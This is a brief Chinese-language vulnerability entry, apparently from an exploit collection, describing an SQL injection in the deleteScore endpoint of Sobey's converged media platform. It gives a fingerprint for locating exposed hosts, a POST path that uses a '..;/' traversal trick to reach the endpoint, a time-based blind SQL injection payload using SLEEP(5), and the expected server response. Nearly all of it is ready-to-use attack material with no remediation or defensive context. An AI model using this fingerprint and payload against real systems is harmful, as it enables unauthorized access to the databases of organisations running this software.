# 索贝融媒体deleteScore存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="689611853"`
- **请求**：`POST /sobey-mchEditor/js/..;/mch/jztEditorScore/deleteScore HTTP/1.1`

**Payload**
```
channelId=1&ids=(1') OR (SELECT 8771 FROM (SELECT(SLEEP(5)))WWB)-- QTWL)&isRead=1&siteCode=&token=&userCode=admin
```
- **响应特征**：500